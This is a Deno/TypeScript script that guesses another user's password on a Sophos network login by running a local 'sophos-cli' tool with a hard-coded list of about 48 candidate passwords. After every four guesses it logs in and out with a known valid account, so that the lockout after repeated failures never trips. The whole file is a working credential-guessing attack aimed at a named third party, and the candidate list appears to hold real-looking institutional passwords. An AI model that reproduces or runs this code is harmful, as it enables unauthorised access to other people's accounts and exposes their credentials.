const username_known = "<YOUR_KNOWN_USERNAME>";
const password_known = "<YOUR_KNOWN_PASSWORD>"; // This has to be added because Sophos doesn't let you connect for a while after 4 consecutive unsuccessful attempts

const username_to_find = "<USER>"; // Enter the username of the person whose password you want to find
 
// TODO: Currently we use an array to store all the password. Use a TOML/JSON file to do this.
const password_list: Array<string> = [
  "157030AR",
  "216031IM",
  "268032SH",
  "185033UM",
  "267037EH",
  "338038RE",
  "323047AI",
  "346048AR",
  "302049IN",
  "357043AR",
  "163044HI",
  "178045HI",
  "005012EH",
  "421013EE",
  "083014EE",
  "419015UL",
  "063016UR",
  "417017AR",
  "053018BH",
  "052019UH",
  "035005IS",
  "087006EH",
  "411007NU",
  "055009RU",
  "045010IS",
  "049001NU",
  "065002AK",
  "416003AS",
  "044005NA",
  "064001AN",
  "412002IT",
  "026003AN",
  "027004OP",
  "008005NU",
  "396006OH",
  "071001HW",
  "019002RI",
  "024003IV",
  "089004NU",
  "427005AJ",
  "424006KS",
  "423007AV",
  "415008UJ",
  "086009IS",
  "073010HR",
  "294042AN",
  "381041OS",
  "199040AS"
];

console.log("LogIn Known: " + username_known + " : " + password_known + "\n");
let p1 = Deno.run({
  cmd: [
    "./sophos-cli",
    username_known,
    password_known,
    "login"
  ]
});
// await its completion
await p1.status();
console.log(
  "***********************************************************************"
);

console.log("LogOut Known " + username_known + " : " + password_known + "\n");
let p2 = Deno.run({
  cmd: [
    "./sophos-cli",
    username_known,
    password_known,
    "logout"
  ]
});
// await its completion
await p2.status();
console.log(
  "***********************************************************************"
);

let i = 0;
let k = 0;

while (k < password_list.length) {
  if ((k + 1) % 5 == 0) {
    console.log(
      "LogIn Known: " + username_known + " : " + password_known + "\n"
    );
    let p1 = Deno.run({
      cmd: [
        "./sophos-cli",
        username_known,
        password_known,
        "login"
      ]
    });
    // await its completion
    await p1.status();
    console.log(
      "***********************************************************************"
    );

    console.log(
      "LogOut Known " + username_known + " : " + password_known + "\n"
    );
    let p2 = Deno.run({
      cmd: [
        "./sophos-cli",
        username_known,
        password_known,
        "logout"
      ]
    });
    // await its completion
    await p2.status();
    console.log(
      "***********************************************************************"
    );
    k++;
  } else {
    console.log(
      "Trying Unknown " + username_to_find + " : " + password_list[i] + "\n"
    );
    let p = Deno.run({
      cmd: [
        "./sophos-cli",
        username_to_find,
        password_list[i],
        "login"
      ]
    });
    // await its completion
    await p.status();
    console.log(
      "***********************************************************************"
    );
    i++;
    k++;
  }
}
